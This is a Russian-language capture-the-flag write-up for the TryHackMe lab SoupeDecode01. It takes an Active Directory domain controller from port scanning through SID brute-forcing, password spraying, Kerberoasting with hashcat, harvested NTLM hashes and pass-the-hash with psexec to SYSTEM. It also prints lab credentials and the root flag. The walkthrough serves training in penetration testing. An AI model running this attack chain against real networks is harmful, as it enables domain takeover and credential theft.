<div align="center">

# 🥣 TryHackMe: SoupeDecode01 — Writeup

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat-square)
![OS](https://img.shields.io/badge/OS-Windows%20Server-0078D6?style=flat-square&logo=windows)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![Category](https://img.shields.io/badge/Category-Active%20Directory-blue?style=flat-square)

Путь от первого скана портов до `NT AUTHORITY\SYSTEM` на контроллере домена Active Directory.

[English version](README_EN.md)

</div>

---

## 📑 Содержание

- [Обзор](#-обзор)
- [1. Разведка и сканирование портов](#1-разведка-и-сканирование-портов-reconnaissance)
- [2. Энумерация пользователей](#2-энумерация-пользователей-user-enumeration)
- [3. Точка входа](#3-точка-входа-initial-access)
- [4. Повышение привилегий](#4-повышение-привилегий-privilege-escalation)
- [Итог](#-итог)

---

## 📝 Обзор

| | |
|---|---|
| **Цель** | `10.113.138.0` (DC01.SOUPEDECODE.LOCAL) |
| **Техники** | SID brute-force, Password Spraying, Kerberoasting, Pass-the-Hash |
| **Инструменты** | `nmap`, `netexec (nxc)`, `impacket`, `smbclient`, `hashcat` |

---

## 1. Разведка и сканирование портов (Reconnaissance)

Как обычно, первым делом выполняем сканирование портов, чтобы понять, какие сервисы работают на целевой машине и определить вектор атаки.

```bash
sudo nmap -sC -sV 10.113.138.0
```

**Вывод Nmap:**

```text
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-02 08:45 -0500
Nmap scan report for 10.113.138.0
Host is up (0.35s latency).
Not shown: 988 filtered tcp ports (no-response)

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-02 13:46:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
...
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
```

Сканирование портов подтверждает, что перед нами контроллер домена Active Directory. Также обнаружено доменное имя `SOUPEDECODE.LOCAL` — добавляем его в `/etc/hosts`.

Проверяем доступные SMB-шары через гостевую сессию:

```bash
nxc smb 10.113.138.0 -u "guest" -p "" --shares
```

> Гостевой доступ открыт только к стандартным шарам (`IPC$`). Попытка перечислить пользователей через `nxc` (`--users`) тоже не принесла результатов.

---

## 2. Энумерация пользователей (User Enumeration)

Поскольку прямое перечисление по SMB не дало плодов, пробуем получить список пользователей через брутфорс SID (Security Identifiers):

```bash
impacket-lookupsid soupedeconde.local/guest:@10.113.138.0
```

**Результат:**

```text
[*] Brute forcing SIDs at 10.113.138.0
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
500: SOUPEDECODE\Administrator (SidTypeUser)
501: SOUPEDECODE\Guest (SidTypeUser)
...
2163: SOUPEDECODE\firewall_svc (SidTypeUser)
2164: SOUPEDECODE\backup_svc (SidTypeUser)
2165: SOUPEDECODE\web_svc (SidTypeUser)
2166: SOUPEDECODE\monitoring_svc (SidTypeUser)
2168: SOUPEDECODE\admin (SidTypeUser)
```

Мы получили огромный список пользователей. Сортируем его, оставляем только логины и сохраняем в файл `users.txt`. Попытка атаки AS-REP Roasting не увенчалась успехом.

---

## 3. Точка входа (Initial Access)

Пробуем базовый Password Spraying с предположением, что у кого-то из пользователей пароль совпадает с логином:

```bash
nxc smb 10.113.138.0 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

✅ **Успех!** Обнаружен ленивый пользователь: `ybob317:ybob317`.

Проверяем доступные шары для этой учетной записи:

```bash
nxc smb 10.113.138.0 -u "ybob317" -p "ybob317" --shares
```

Помимо стандартных, у нас есть доступ к чтению шары `Users`. Подключаемся к ней через `smbclient` и забираем первый флаг:

```bash
smbclient //10.113.138.0/Users -U "ybob317%ybob317"
smb: \> cd ybob317\Desktop
smb: \ybob317\Desktop\> get user.txt
```

🚩 **User Flag захвачен!**

---

## 4. Повышение привилегий (Privilege Escalation)

Обычный пользователь домена имеет законное право запрашивать билеты Kerberos (TGS) для любых сервисов с зарегистрированными SPN. Выполняем Kerberoasting:

```bash
impacket-GetUserSPNs soupedecode.local/ybob317:ybob317 -dc-ip 10.113.138.0 -request -outputfile hash.txt
```

Удалось перехватить хэши для нескольких сервисных аккаунтов (`file_svc`, `firewall_svc`, `backup_svc`, `web_svc`, `monitoring_svc`).

Брутим их в `hashcat` со словарем `rockyou`:

```bash
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
cat cracked.txt
```

Расшифрован пароль для одного из сервисов: `Password123!!`.

Проверяем, к какому аккаунту он подходит:

```bash
nxc smb 10.113.138.0 -u "file_svc" -p 'Password123!!'
```

Пароль подходит к учетке `file_svc`. Проверяем доступные ей ресурсы и видим доступ к шаре `backup`!

Скачиваем содержимое:

```bash
smbclient //10.113.138.0/backup -U 'file_svc%Password123!!'
smb: \> get backup_extract.txt
```

В файле `backup_extract.txt` обнаруживаем NTLM-хэши учетных записей компьютеров:

```text
WebServer:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
FileServer:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
...
```

Проводим атаку **Pass-The-Hash** (PtH) с учеткой `FileServer$`, чтобы получить полный доступ к системе (шеллам):

```bash
impacket-psexec SOUPEDECODE.LOCAL/FileServer\$@10.113.138.0 -hashes :e41da7e79a4c76dbd9cf79d1cb325559
```

**Результат:**

```text
[*] Starting service SMwz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.587]
C:\Windows\system32> whoami
nt authority\system
```

Читаем рут-флаг:

```cmd
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
27cb2be302c388d63d27c86bfdd5f56a
```

---

## 🏁 Итог

**Машина полностью скомпрометирована!** Цепочка атаки:

```
Guest SMB → SID Brute-force → Password Spray → User Flag
    → Kerberoasting → Hash Crack → Backup Share
    → Machine Hash Leak → Pass-the-Hash → SYSTEM / Root Flag
```

